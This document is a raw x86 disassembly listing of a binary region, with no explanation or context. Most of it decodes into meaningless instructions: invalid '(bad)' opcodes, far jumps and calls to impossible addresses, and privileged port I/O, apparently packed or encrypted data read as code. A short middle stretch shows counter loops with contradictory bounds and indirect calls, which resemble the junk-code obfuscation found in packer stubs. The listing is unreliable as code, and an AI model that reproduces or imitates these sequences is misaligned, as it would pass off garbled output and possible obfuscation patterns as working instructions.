  40a6f9:	les    ebp,FWORD PTR [edx-0x50]
  40a6fc:	cdq    
  40a6fd:	xchg   ecx,eax
  40a6fe:	or     al,0x96
  40a700:	jno    0x40a6fa
  40a702:	jl     0x40a684
  40a704:	adc    al,0x70
  40a706:	stos   DWORD PTR es:[edi],eax
  40a707:	sbb    edx,ecx
  40a709:	inc    esi
  40a70a:	sub    BYTE PTR [edi-0x24],dl
  40a70d:	adc    al,0xca
  40a70f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a710:	jns    0x40a6bf
  40a712:	out    dx,al
  40a713:	adc    al,0x36
  40a715:	pop    DWORD PTR [edi*1-0x3c61efcb]
  40a71c:	jns    0x40a760
  40a71e:	shl    ebp,0xf9
  40a721:	jl     0x40a6a3
  40a723:	adc    BYTE PTR fs:[esi+eax*4-0x7d],ah
  40a728:	adc    ch,dl
  40a72a:	ret    
  40a72b:	dec    esp
  40a72c:	add    DWORD PTR [edx+0x2d],edx
  40a72f:	(bad)  
  40a730:	mov    cl,0xab
  40a732:	test   al,0xcd
  40a734:	rol    DWORD PTR [edx+0x5],0x8b
  40a738:	call   0xd76b:0x20be1638
  40a73f:	xchg   esp,eax
  40a740:	and    BYTE PTR [esi],cl
  40a742:	inc    eax
  40a743:	jno    0x40a6e7
  40a745:	jae    0x40a74f
  40a747:	dec    eax
  40a748:	retf   0x7327
  40a74b:	xchg   edx,eax
  40a74c:	stc    
  40a74d:	retf   
  40a74e:	jge    0x40a701
  40a750:	repnz out 0x3e,al
  40a753:	sub    BYTE PTR ss:[ebx+0xa97eb54],0xdb
  40a75b:	outs   dx,BYTE PTR ds:[esi]
  40a75c:	jmp    0x7dfc7fe9
  40a761:	add    dh,dl
  40a763:	(bad)  
  40a764:	jmp    0x2432da54
  40a769:	dec    edx
  40a76a:	out    dx,eax
  40a76b:	or     DWORD PTR [ecx-0x5],ecx
  40a76e:	ins    BYTE PTR es:[edi],dx
  40a76f:	inc    eax
  40a770:	adc    cl,BYTE PTR [ebx+esi*1+0x6b]
  40a774:	imul   edx,DWORD PTR [ebp+0x1a],0x19
  40a778:	or     BYTE PTR [esi+0x7f],cl
  40a77b:	loop   0x40a7ce
  40a77d:	es xchg esi,eax
  40a77f:	xchg   DWORD PTR [eax],edi
  40a781:	push   ecx
  40a782:	bound  edx,QWORD PTR [ebx-0x40ec4a22]
  40a788:	jmp    0xcdf6a73c
  40a78d:	xor    BYTE PTR [ecx],bl
  40a78f:	mov    eax,ds:0xadb075e1
  40a794:	das    
  40a795:	in     al,0xa1
  40a797:	jno    0x40a7f4
  40a799:	cmp    BYTE PTR [eax+0x5290266a],al
  40a79f:	inc    ebx
  40a7a0:	repz jle 0x40a7bd
  40a7a3:	(bad)  
  40a7a5:	test   BYTE PTR [ebp+0x78],0x88
  40a7a9:	mov    eax,ds:0x79b9e63b
  40a7ae:	jmp    0x8b8d:0x25180bc8
  40a7b5:	push   esi
  40a7b6:	and    eax,0x9b2e7959
  40a7bb:	ds (bad) 
  40a7bd:	scas   eax,DWORD PTR es:[di]
  40a7bf:	xor    cl,BYTE PTR ds:0x491dd1bf
  40a7c5:	push   cs
  40a7c6:	cmp    al,0xe1
  40a7c8:	cli    
  40a7c9:	jg     0x40a7cc
  40a7cb:	adc    DWORD PTR [ebp-0xe632f0f],ecx
  40a7d1:	pushf  
  40a7d2:	sbb    ebp,DWORD PTR [esp+edx*4]
  40a7d5:	retf   0x3365
  40a7d8:	mov    ebx,0xf05f9927
  40a7dd:	adc    al,BYTE PTR [eax]
  40a7df:	mov    ch,0xe
  40a7e1:	push   ss
  40a7e2:	arpl   WORD PTR [esi],dx
  40a7e4:	imul   esp,DWORD PTR [esi-0x27e0daf9],0xffffffab
  40a7eb:	and    BYTE PTR [esi+0x2dbf7e4a],0xbe
  40a7f2:	mov    eax,0x469ea83
  40a7f7:	adc    dh,BYTE PTR ss:[esi+0x7c]
  40a7fb:	xor    cl,BYTE PTR [ebx-0x128e34ef]
  40a801:	idiv   BYTE PTR [esi+0xbe9560c]
  40a807:	add    eax,0xc5f32245
  40a80c:	mov    edx,eax
  40a80e:	imul   edx,ecx,0x63f44b03
  40a814:	loop   0x40a86d
  40a816:	sbb    ebp,ebp
  40a818:	test   DWORD PTR [esp+eiz*8-0x35],eax
  40a81c:	fst    st(4)
  40a81e:	xor    al,0xa5
  40a820:	jno    0x40a7ed
  40a822:	jne    0x40a800
  40a824:	lods   al,BYTE PTR ds:[esi]
  40a825:	mov    dl,0xd8
  40a827:	and    eax,0x9c0e946a
  40a82c:	jl     0x40a847
  40a82e:	jle    0x40a875
  40a830:	add    eax,DWORD PTR [esi+0x3e]
  40a833:	or     al,0xe9
  40a835:	in     al,0xd1
  40a837:	jle    0x40a7f3
  40a839:	xchg   DWORD PTR [edx],esi
  40a83b:	mov    esp,0x8b9df796
  40a840:	add    al,0x8a
  40a842:	push   eax
  40a843:	sub    DWORD PTR [ebx-0x6a],esi
  40a846:	stos   DWORD PTR es:[edi],eax
  40a847:	data16 shr BYTE PTR [eax-0x30],0xcc
  40a84c:	inc    eax
  40a84d:	outs   dx,BYTE PTR ds:[esi]
  40a84e:	jmp    0x6b6b0490
  40a853:	and    bh,BYTE PTR [ebx-0x4f191fca]
  40a859:	xchg   cl,cl
  40a85b:	add    al,0xbf
  40a85d:	ss or  cl,dl
  40a860:	outs   dx,BYTE PTR ds:[esi]
  40a861:	ins    BYTE PTR es:[edi],dx
  40a862:	or     DWORD PTR [eax+ebx*1-0x72],eax
  40a866:	dec    esp
  40a867:	int3   
  40a868:	xchg   BYTE PTR [ecx-0x2641a0f0],bh
  40a86e:	push   ebp
  40a86f:	fwait
  40a870:	repnz or ah,BYTE PTR [edi+0x30d58b83]
  40a877:	cmp    DWORD PTR [eax+0x5b679d51],ebp
  40a87d:	cmp    dl,0xc9
  40a880:	in     eax,dx
  40a881:	pop    esi
  40a882:	xchg   edi,eax
  40a883:	mov    BYTE PTR [ebx+0x15e465],bl
  40a889:	call   DWORD PTR [ebp+0x7c]
  40a88c:	and    eax,0xe183595f
  40a891:	cld    
  40a892:	out    0x93,al
  40a894:	xchg   esi,eax
  40a895:	xchg   esp,eax
  40a896:	or     al,0x51
  40a898:	test   DWORD PTR [ecx-0x30137554],edi
  40a89e:	fild   DWORD PTR [ebx+0x24]
  40a8a1:	scas   eax,DWORD PTR es:[edi]
  40a8a2:	jl     0x40a85a
  40a8a4:	mov    ds:0x8a3e98f7,al
  40a8a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a8aa:	ds cmc 
  40a8ac:	pusha  
  40a8ad:	(bad)  
  40a8ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a8af:	jns    0x40a8e3
  40a8b1:	fisttp QWORD PTR [ebp-0x682e54dc]
  40a8b7:	pop    ds
  40a8b8:	ins    BYTE PTR es:[edi],dx
  40a8b9:	sub    al,0x2e
  40a8bb:	aam    0xb0
  40a8bd:	add    al,dl
  40a8bf:	nop
  40a8c0:	sbb    DWORD PTR [esi-0x7e45a7be],eax
  40a8c6:	or     DWORD PTR [eax-0x77882542],edi
  40a8cc:	mov    cl,BYTE PTR [ecx-0x5cc66e90]
  40a8d2:	xchg   esp,eax
  40a8d3:	jmp    0x40a8b7
  40a8d5:	int3   
  40a8d6:	sub    BYTE PTR [esi+edi*8+0x72516f8b],dl
  40a8dd:	call   0xb40f:0x7924e5a
  40a8e4:	jmp    0x9cbd:0xbcb097bf
  40a8eb:	sbb    dh,BYTE PTR [eax+0x7285b9df]
  40a8f1:	(bad)  
  40a8f2:	leave  
  40a8f3:	mov    ds:0x6872bc7c,eax
  40a8f8:	mov    WORD PTR [ecx-0x2b547a90],es
  40a8fe:	jecxz  0x40a8a6
  40a900:	xchg   ebp,eax
  40a901:	jae    0x40a921
  40a903:	dec    eax
  40a904:	jmp    0x7e6104d3
  40a909:	gs or  al,0x21
  40a90c:	add    eax,DWORD PTR [esi+0x3f58f03]
  40a912:	adc    dl,BYTE PTR [ebx-0x8be4828]
  40a918:	retf   
  40a919:	sub    DWORD PTR [eax-0x4c],esp
  40a91c:	hlt    
  40a91d:	in     eax,0x67
  40a91f:	fcmovb st,st(3)
  40a921:	clc    
  40a922:	out    0x6d,eax
  40a924:	adc    al,0x69
  40a926:	push   ds
  40a927:	fwait
  40a928:	jg     0x40a961
  40a92a:	inc    ebp
  40a92b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a92c:	xlat   BYTE PTR ds:[ebx]
  40a92d:	aam    0xb3
  40a92f:	mov    ah,0xb4
  40a931:	pop    ecx
  40a932:	or     esi,DWORD PTR [eax-0x2c131e5b]
  40a938:	pusha  
  40a939:	sti    
  40a93a:	ins    BYTE PTR es:[edi],dx
  40a93b:	(bad)  
  40a93c:	jmp    0x40a8c0
  40a93e:	inc    esi
  40a93f:	xor    DWORD PTR [esi-0x56],ebx
  40a942:	xor    bl,BYTE PTR [eax-0xc]
  40a945:	sbb    eax,0x1b9b0721
  40a94a:	xchg   esi,eax
  40a94b:	sub    BYTE PTR [edi-0x37],dh
  40a94e:	adc    al,0x10
  40a950:	shr    ebp,1
  40a952:	cmc    
  40a953:	ja     0x40a8d6
  40a955:	lods   eax,DWORD PTR ds:[esi]
  40a956:	sbb    BYTE PTR [edx+0x35],cl
  40a959:	mov    edi,edi
  40a95b:	dec    eax
  40a95c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a95d:	es ds out dx,eax
  40a960:	cwde   
  40a961:	pop    ecx
  40a962:	mov    DWORD PTR [edx+0x133a5fc4],0xc966665a
  40a96c:	mov    esi,0xe0c671a0
  40a971:	add    dl,ah
  40a973:	pop    eax
  40a974:	mov    al,ds:0xb5bbdb8f
  40a979:	stc    
  40a97a:	mov    cl,0x1e
  40a97c:	or     DWORD PTR [edi+ebp*1],esi
  40a97f:	jle    0x40a9eb
  40a981:	dec    ebx
  40a982:	xchg   edi,eax
  40a983:	push   ebx
  40a984:	or     al,cl
  40a986:	adc    ecx,DWORD PTR [edx-0x36]
  40a989:	sub    al,0x90
  40a98b:	mov    esp,0x49b8f762
  40a990:	rcl    DWORD PTR [esi-0x7f],0xd
  40a994:	jg     0x40a924
  40a996:	inc    edx
  40a997:	add    cl,ah
  40a999:	jp     0x40a99b
  40a99b:	add    BYTE PTR [esi+0x75108af],bh
  40a9a1:	xor    eax,esi
  40a9a3:	push   edi
  40a9a4:	and    edi,0x47d2
  40a9aa:	mov    edi,0x3272f6
  40a9af:	and    DWORD PTR ds:0x428e57,0xe9
  40a9b9:	add    eax,edi
  40a9bb:	mov    DWORD PTR [ebp-0x1c],eax
  40a9be:	mov    eax,DWORD PTR [ebp+0x14]
  40a9c1:	adc    DWORD PTR ds:0x428e97,0x7644
  40a9cb:	test   eax,eax
  40a9cd:	je     0x40aa21
  40a9d3:	and    DWORD PTR ds:0x428e83,0x0
  40a9dd:	mov    eax,ds:0x428e83
  40a9e2:	inc    eax
  40a9e3:	mov    ds:0x428e83,eax
  40a9e8:	cmp    DWORD PTR ds:0x428e83,0x1e
  40a9ef:	jl     0x40aa18
  40a9f5:	jmp    0x40aa0b
  40a9fa:	push   DWORD PTR [ebp-0x24]
  40a9fd:	push   0x428e43
  40aa02:	push   DWORD PTR [ebp-0x10]
  40aa05:	call   DWORD PTR ds:0x42aa1f
  40aa0b:	cmp    DWORD PTR ds:0x428e83,0x17
  40aa12:	jb     0x40a9dd
  40aa18:	mov    eax,DWORD PTR [ebp+0x14]
  40aa1b:	mov    eax,DWORD PTR [eax]
  40aa1d:	dec    ebx
  40aa1e:	mov    DWORD PTR [ebp-0x1c],eax
  40aa21:	mov    eax,DWORD PTR [ebp-0x4]
  40aa24:	xor    DWORD PTR ds:0x428e2b,0x506a
  40aa2e:	xor    eax,esi
  40aa30:	and    DWORD PTR ds:0x428e7f,edi
  40aa36:	add    eax,edi
  40aa38:	mov    DWORD PTR [ebp-0x8],eax
  40aa3b:	mov    DWORD PTR ds:0x428e97,0x1e
  40aa45:	cmp    DWORD PTR ds:0x428e97,0x0
  40aa4c:	je     0x40aa81
  40aa52:	cmp    DWORD PTR ds:0x428e97,0x20
  40aa59:	jg     0x40aa81
  40aa5f:	jmp    0x40aa6f
  40aa64:	push   0x4281a7
  40aa69:	call   DWORD PTR ds:0x42a9eb
  40aa6f:	mov    ebx,DWORD PTR ds:0x428e97
  40aa75:	dec    ebx
  40aa76:	mov    DWORD PTR ds:0x428e97,ebx
  40aa7c:	jmp    0x40aa45
  40aa81:	mov    eax,DWORD PTR [ebp-0xc]
  40aa84:	add    DWORD PTR ds:0x428eaf,edx
  40aa8a:	xor    eax,esi
  40aa8c:	add    eax,edi
  40aa8e:	mov    ebx,DWORD PTR ds:0x429bab
  40aa94:	mov    ebx,DWORD PTR [ebx]
  40aa96:	or     DWORD PTR ds:0x428ebb,ebx
  40aa9c:	mov    DWORD PTR [ebp-0x24],eax
  40aa9f:	and    DWORD PTR ds:0x428e27,0x0
  40aaa9:	jmp    0x40aabb
  40aaae:	mov    ebx,DWORD PTR ds:0x428e27
  40aab4:	inc    ebx
  40aab5:	mov    DWORD PTR ds:0x428e27,ebx
  40aabb:	cmp    DWORD PTR ds:0x428e27,0x13
  40aac2:	jae    0x40ce99
  40aac8:	cmp    DWORD PTR ds:0x428e27,0x18
  40aacf:	jle    0x40ce99
  40aad5:	jmp    0x40aae5
  40aada:	push   0x428173
  40aadf:	call   DWORD PTR ds:0x42a9ef
  40aae5:	jmp    0x40aaae
  40aaea:	jmp    0x40ce99
  40aaef:	dec    edx
  40aaf0:	shr    ah,1
  40aaf2:	shl    esp,0x9d
  40aaf5:	push   es
  40aaf6:	mov    bl,dl
  40aaf8:	adc    BYTE PTR [edx+0x6f],bh
  40aafb:	lods   eax,DWORD PTR ds:[esi]
  40aafc:	sub    ebx,ebp
  40aafe:	pop    eax
  40aaff:	out    0xf6,eax
  40ab01:	add    DWORD PTR [ebx-0x7c7c9f0f],0x58
  40ab08:	jmp    0x9f4577f0
  40ab0d:	or     DWORD PTR [ebx-0x724b49da],ebx
  40ab13:	stos   DWORD PTR es:[edi],eax
  40ab14:	sbb    BYTE PTR [ecx+0x48514189],cl
  40ab1a:	ret    
  40ab1b:	cdq    
  40ab1c:	aaa    
  40ab1d:	mov    WORD PTR [ecx+edx*1+0x4f366018],gs
  40ab24:	retf   0x7889
  40ab27:	or     dl,BYTE PTR [edi+0x2253ca37]
  40ab2d:	in     al,0xd9
  40ab2f:	pop    edx
  40ab30:	aam    0x87
  40ab32:	sub    BYTE PTR [eax],ch
  40ab34:	and    al,0xf6
  40ab36:	aam    0x3a
  40ab38:	jecxz  0x40aaf9
  40ab3a:	adc    al,0x59
  40ab3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab3d:	jmp    0x40ab62
  40ab3f:	or     al,0x32
  40ab41:	jecxz  0x40ab57
  40ab43:	shr    esp,cl
  40ab45:	imul   edi,DWORD PTR [ecx-0x65],0x6bce3599
  40ab4c:	mov    cl,0x56
  40ab4e:	mov    ch,0x9e
  40ab50:	pop    ss
  40ab51:	and    al,0x54
  40ab53:	jne    0x40abc8
  40ab55:	test   DWORD PTR [edx+ebx*8-0x2efaead5],ebx
  40ab5c:	mov    esp,DWORD PTR [ebx]
  40ab5e:	dec    edi
  40ab5f:	xchg   edx,eax
  40ab60:	and    DWORD PTR [edi],esi
  40ab62:	aas    
  40ab63:	lea    ebx,[edi]
  40ab65:	aaa    
  40ab66:	push   edi
  40ab67:	(bad)  
  40ab68:	call   0x2319:0x1e0600bf
  40ab6f:	lods   eax,DWORD PTR ds:[esi]
  40ab70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab71:	sbb    al,0xb8
  40ab73:	and    BYTE PTR [edi+edx*1+0x3286003],bl
  40ab7a:	xchg   edi,eax
  40ab7b:	xchg   ecx,eax
  40ab7c:	ins    DWORD PTR es:[edi],dx
  40ab7d:	(bad)  
  40ab7e:	and    edi,DWORD PTR [ebx+0x6941f734]
  40ab84:	xchg   esi,eax
  40ab85:	ins    DWORD PTR es:[edi],dx
  40ab86:	sahf   
  40ab87:	imul   eax,DWORD PTR [ebx],0xb25ca43b
  40ab8d:	mov    edx,0xf941eff3
  40ab92:	test   DWORD PTR [esi+edx*1-0x61],esp
  40ab96:	aaa    
  40ab97:	cmp    ecx,DWORD PTR [edi]
  40ab99:	jno    0x40ab52
  40ab9b:	adc    BYTE PTR [ebx+eiz*2],al
  40ab9e:	xchg   ecx,eax
  40ab9f:	push   esp
  40aba0:	stos   BYTE PTR es:[edi],al
  40aba1:	sbb    DWORD PTR [ecx],edx
  40aba3:	(bad)  
  40aba4:	mov    esp,0x3abde2e3
  40aba9:	jno    0x40abdd
  40abab:	bound  ecx,QWORD PTR [ebx+0x48]
  40abae:	je     0x40ab46
  40abb0:	pushf  
  40abb1:	adc    dl,BYTE PTR [edi]
  40abb3:	and    ch,ah
  40abb5:	add    cl,bh
  40abb7:	call   0xc11acb1a
  40abbc:	add    ah,BYTE PTR [ebp+0x63]
  40abbf:	retf   0x66f3
  40abc2:	sbb    BYTE PTR [ebx+ebp*2-0x4289eed6],bl
  40abc9:	xchg   edi,eax
  40abca:	inc    eax
  40abcb:	enter  0xa185,0x77
  40abcf:	jp     0x40ab86
  40abd1:	std    
  40abd2:	jae    0x40ab9d
  40abd4:	outs   dx,DWORD PTR ds:[esi]
  40abd5:	bound  esp,QWORD PTR [edi]
  40abd7:	inc    ebx
  40abd8:	ins    BYTE PTR es:[edi],dx
  40abd9:	shr    BYTE PTR [edx],cl
  40abdb:	and    esp,DWORD PTR [ecx-0x1249d506]
  40abe1:	jp     0x40ac42
  40abe3:	fisubr WORD PTR [eax+0x1b]
  40abe6:	ss lock cdq 
  40abe9:	mov    ebp,0x24eb8639
  40abee:	xor    dl,ch
  40abf0:	(bad)  [edx]
  40abf2:	dec    ebp
  40abf3:	xchg   esi,eax
  40abf4:	aad    0x17
  40abf6:	push   edx
  40abf7:	push   0x94c075d9
  40abfc:	sbb    eax,0x27997e4f
  40ac01:	dec    ebp
  40ac02:	xchg   ecx,eax
  40ac03:	cmp    edi,DWORD PTR [eax-0x5b738f3b]
  40ac09:	push   esi
  40ac0a:	outs   dx,BYTE PTR ds:[esi]
  40ac0b:	cdq    
  40ac0c:	or     eax,0xdce6d534
  40ac11:	or     eax,DWORD PTR [esi+0x37]
  40ac14:	pop    ebp
  40ac15:	outs   dx,DWORD PTR ds:[esi]
  40ac16:	and    al,0xba
  40ac18:	dec    edx
  40ac19:	add    DWORD PTR [esi-0x34a9afe6],0x3b
  40ac20:	lahf   
  40ac21:	push   ecx
  40ac22:	(bad)  
  40ac23:	fist   WORD PTR [edx]
  40ac25:	dec    BYTE PTR [ebx]
  40ac27:	pop    edx
  40ac28:	xchg   esp,eax
  40ac29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac2b:	dec    edx
  40ac2c:	cs mov ebx,ebx
  40ac2f:	sbb    al,ch
  40ac31:	mov    WORD PTR [ebp-0x1b],fs
  40ac34:	xor    BYTE PTR [ecx],dh
  40ac36:	(bad)  
  40ac37:	push   ss
  40ac38:	push   ss
  40ac39:	dec    edx
  40ac3a:	cmp    edx,esi
  40ac3c:	or     al,0x9a
  40ac3e:	in     eax,dx
  40ac3f:	pop    esp
  40ac40:	xchg   ecx,eax
  40ac41:	xchg   ebx,eax
  40ac42:	addr16 add eax,0x1baad4c
  40ac48:	xor    BYTE PTR [ebx],0x4c
  40ac4b:	(bad)  
  40ac4c:	mov    cl,0x80
  40ac4e:	outs   dx,DWORD PTR ds:[esi]
  40ac4f:	std    
  40ac50:	push   ecx
  40ac51:	push   ds
  40ac52:	sbb    BYTE PTR [esi-0x5a3ce38b],cl
  40ac58:	cmp    al,0xcf
  40ac5a:	lds    ebp,FWORD PTR [ebx-0x6c]
  40ac5d:	retf   
  40ac5e:	jne    0x40ac0b
  40ac60:	ja     0x40acca
  40ac62:	add    al,0xd4
  40ac64:	scas   eax,DWORD PTR es:[edi]
  40ac65:	inc    ebp
  40ac66:	or     bl,BYTE PTR [edx-0x6c3c1288]
  40ac6c:	lea    ebp,[eax+0x1ce1301]
  40ac72:	nop
  40ac73:	fnop   
  40ac75:	sti    
  40ac76:	mov    al,0xb2
  40ac78:	xchg   edx,eax
  40ac79:	neg    BYTE PTR [ebx]
  40ac7b:	sub    DWORD PTR [ecx],ebx
  40ac7d:	cdq    
  40ac7e:	or     cl,BYTE PTR [esi]
  40ac80:	out    0xfe,al
  40ac82:	mov    esp,0x3071bd00
  40ac87:	and    DWORD PTR [edi-0x1dca08a],eax
  40ac8d:	xor    DWORD PTR [edx+0x66],edx
  40ac90:	lahf   
  40ac91:	in     al,0x3
  40ac93:	test   eax,0xd2f3ae26
  40ac98:	pop    edi
  40ac99:	jo     0x40ac5f
  40ac9b:	test   al,0x1
  40ac9d:	pop    ss
  40ac9e:	shr    bl,0x6b
  40aca1:	out    0x94,al
  40aca3:	imul   ebx,DWORD PTR fs:[edi-0x2eb1d1a1],0x61
  40acab:	leave  
  40acac:	push   es
  40acad:	leave  
  40acae:	fmul   st(5),st
  40acb0:	pop    eax
  40acb1:	and    ebx,ecx
  40acb3:	sub    BYTE PTR es:[ecx-0x1f59f065],ch
  40acba:	sub    ah,BYTE PTR [eax]
  40acbc:	pusha  
  40acbd:	ja     0x40ac45
  40acbf:	jp     0x40aced
  40acc1:	aas    
  40acc2:	or     BYTE PTR [edx-0x10],bl
  40acc5:	mov    eax,0xf77185ca
  40acca:	mov    esp,0x8d338ce9
  40accf:	outs   dx,BYTE PTR ds:[esi]
  40acd0:	inc    ebx
  40acd1:	jl     0x40ad27
  40acd3:	add    eax,eax
  40acd5:	sbb    edi,DWORD PTR [ebp+0x2cb85e44]
  40acdb:	rcr    BYTE PTR [ebp+esi*2-0xed778aa],1
  40ace2:	leave  
  40ace3:	test   eax,0xff540f44
  40ace8:	mov    ds:0x1171e938,eax
  40aced:	out    0x5f,eax
  40acef:	mov    ds:0x87b05dde,eax
  40acf4:	xlat   BYTE PTR ds:[ebx]
  40acf5:	cmp    DWORD PTR [edx],ecx
  40acf7:	mov    ds,WORD PTR [ebp+0xc]
  40acfa:	sbb    al,0x29
  40acfc:	adc    ebx,ecx
  40acfe:	je     0x40ad21
  40ad00:	or     eax,0xfa6ddad2
  40ad05:	stos   DWORD PTR es:[edi],eax
  40ad06:	js     0x40ad37
  40ad08:	jge    0x40acd4
  40ad0a:	lock or DWORD PTR [esi],edi
  40ad0d:	imul   ecx,DWORD PTR [esi],0x4c920230
  40ad13:	xchg   ecx,eax
  40ad14:	loopne 0x40acff
  40ad16:	imul   edx,DWORD PTR [edi-0x13a331e2],0xffffffee
  40ad1d:	mov    ch,0x50
  40ad1f:	fsub   DWORD PTR es:[ecx+0x3f]
  40ad23:	stos   DWORD PTR es:[edi],eax
  40ad24:	cmp    al,0x3b
  40ad26:	mov    ebp,0x471fe972
  40ad2b:	dec    edi
  40ad2c:	xor    edx,ecx
  40ad2e:	daa    
  40ad2f:	sbb    dh,BYTE PTR ds:0x2cd02b55
  40ad35:	adc    ah,BYTE PTR [ecx-0x73]
  40ad38:	ror    BYTE PTR [eax+0x27],cl
  40ad3b:	mov    cl,0xcf
  40ad3d:	fld    TBYTE PTR [eax-0x57b8455b]
  40ad43:	enter  0x6f1d,0xff
  40ad47:	imul   ecx,DWORD PTR [esi-0x3c45ffdc],0x25
  40ad4e:	sbb    al,0xc9
  40ad50:	cs inc ebp
  40ad52:	out    dx,eax
  40ad53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad54:	and    bh,dh
  40ad56:	or     al,BYTE PTR [esi-0x691307c1]
  40ad5c:	out    0xa5,al
  40ad5e:	jnp    0x40acf5
  40ad60:	sbb    al,0x6e
  40ad62:	inc    ebp
  40ad63:	mov    esp,0x6516a99a
  40ad68:	xor    al,0x1c
  40ad6a:	dec    ecx
  40ad6b:	mov    eax,ds:0xcf49403a
  40ad70:	test   al,0x8
  40ad72:	sbb    BYTE PTR [ebp-0x54c1dece],ah
  40ad78:	and    bl,BYTE PTR [ecx+edi*2-0x6788d66c]
  40ad7f:	rep stos DWORD PTR es:[edi],eax
  40ad81:	bswap  ecx
  40ad83:	adc    DWORD PTR gs:[esi-0x6e7f3da4],ecx
  40ad8a:	mov    bl,bl
  40ad8c:	ds aam 0x9e
  40ad8f:	and    BYTE PTR [eax+ebx*2],0x55
  40ad93:	pop    ds
  40ad94:	lods   eax,DWORD PTR ds:[esi]
  40ad95:	push   ds
  40ad96:	nop
  40ad97:	retf   0x1ff3
  40ad9a:	inc    edi
  40ad9b:	fld1   
  40ad9d:	inc    eax
  40ad9e:	(bad)  
  40ada1:	mov    ds:0x485e2878,al
  40ada6:	jg     0x40ad77
  40ada8:	xchg   ebx,eax
  40ada9:	xchg   esp,eax
  40adaa:	mov    ecx,ecx
  40adac:	ss enter 0xa82c,0x85
  40adb1:	push   ebx
  40adb2:	aad    0x3
  40adb4:	mov    edi,0x4aa05ecd
  40adb9:	jbe    0x40ad5a
  40adbb:	jno    0x40ad3e
  40adbd:	cmc    
  40adbe:	push   esi
  40adbf:	push   eax
  40adc0:	sbb    BYTE PTR [edx+ebp*2+0x5b],cl
  40adc4:	or     cl,BYTE PTR [eax]
  40adc6:	stc    
  40adc7:	jae    0x40adf1
  40adc9:	stos   DWORD PTR es:[edi],eax
  40adca:	fsub   DWORD PTR [ebx-0x72cf32e]
  40add0:	or     al,0xa7
  40add2:	or     al,BYTE PTR [ebp-0x35]
  40add5:	and    BYTE PTR [esi-0x236860b4],ch
  40addb:	(bad)  
  40addc:	mov    ah,0x7c
  40adde:	adc    DWORD PTR [esi+0x36],ecx
  40ade1:	and    eax,0xeeee322d
  40ade6:	mov    bh,0xde
  40ade8:	sub    dl,BYTE PTR [edx+0x7c4e8cc1]
  40adee:	(bad)  
  40adef:	cmp    eax,0x63adbd87
  40adf4:	jae    0x40ad8f
  40adf6:	jp     0x40ae41
  40adf8:	mov    es,WORD PTR [ebx+ebp*4]
  40adfb:	cmp    esi,DWORD PTR [eax]
  40adfd:	and    eax,0x96e4705b
  40ae02:	mov    ebx,0x10135235
  40ae07:	mov    ecx,0x1fb64a24
  40ae0c:	push   0x16d28706
  40ae11:	push   ebx
  40ae12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae13:	inc    ebx
  40ae14:	mov    es,WORD PTR [edx-0x73]
  40ae17:	out    dx,al
  40ae18:	push   ebp
  40ae19:	push   es
  40ae1a:	pop    esp
  40ae1b:	or     edi,ecx
  40ae1d:	mov    ds:0xb750e00e,al
  40ae22:	int3   
  40ae23:	(bad)  
  40ae24:	push   edi
  40ae25:	mov    ah,BYTE PTR [edi+0x1]
  40ae28:	out    dx,eax
  40ae29:	je     0x40ae54
  40ae2b:	or     al,0x5d
  40ae2d:	mov    BYTE PTR [eax-0x3c],al
  40ae30:	dec    ecx
  40ae31:	add    BYTE PTR [edx+0x43],ah
  40ae34:	daa    
  40ae35:	fnstenv [esi+0x48]
  40ae38:	mov    bh,0x68
  40ae3a:	into   
  40ae3b:	jno    0x40addc
  40ae3d:	and    BYTE PTR [edi-0x5d],dl
  40ae40:	inc    edx
  40ae41:	adc    eax,ebp
  40ae43:	sub    dh,BYTE PTR ds:0x150aba1
  40ae49:	mov    eax,ds:0xc600d95a
  40ae4e:	adc    ecx,esp
  40ae50:	xchg   edx,eax
  40ae51:	inc    edx
  40ae52:	or     dl,BYTE PTR [ecx]
  40ae54:	mov    ebx,0x3a24525d
  40ae59:	dec    ecx
  40ae5a:	jecxz  0x40aeda
  40ae5c:	sahf   
  40ae5d:	mov    esp,0xfcefbd2
  40ae62:	mov    BYTE PTR cs:[edi+0x25aee99d],0xdc
  40ae6a:	dec    bp
  40ae6c:	bound  edx,QWORD PTR [edi+0x736f3e3]
  40ae72:	mov    bl,0x40
  40ae74:	mov    DWORD PTR [esp+edi*1+0x40],0xd68693bf
  40ae7c:	dec    eax
  40ae7d:	mov    BYTE PTR [ebx+0x783490a8],al
  40ae83:	cmc    
  40ae84:	aad    0x78
  40ae86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae88:	xchg   edx,eax
  40ae89:	sbb    DWORD PTR [edi],0x78014f52
  40ae8f:	retf   
  40ae90:	(bad)  
  40ae91:	and    eax,0x3368c322
  40ae96:	dec    ebp
  40ae97:	jae    0x40ae55
  40ae99:	xchg   ebx,eax
  40ae9a:	test   eax,0xc6990b44
  40ae9f:	les    ecx,FWORD PTR [eax+esi*1]
  40aea2:	pop    esi
  40aea3:	leave  
  40aea4:	push   ebx
  40aea5:	xchg   esi,eax
  40aea6:	xor    ch,BYTE PTR [ebx]
  40aea8:	and    ebp,esi
  40aeaa:	mov    dl,0xb3
  40aeac:	aad    0xc4
  40aeae:	jo     0x40af11
  40aeb0:	sbb    bh,dh
  40aeb2:	ja     0x40ae8e
  40aeb4:	mov    edx,0xbf5b98a1
  40aeb9:	jg     0x40ae58
  40aebb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aebc:	jg     0x40af0b
  40aebe:	dec    ecx
  40aebf:	fwait
  40aec0:	leave  
  40aec1:	adc    DWORD PTR [esi+0x29],0x20
  40aec5:	in     al,0xbf
  40aec7:	jp     0x40aeb3
  40aec9:	fnstenv [ebx]
  40aecb:	add    al,0x64
  40aecd:	cmp    eax,0x8052b1df
  40aed2:	mov    edx,0xc00f1be0
  40aed7:	jmp    0x8856:0x5c6a1a43
  40aede:	push   0x1c
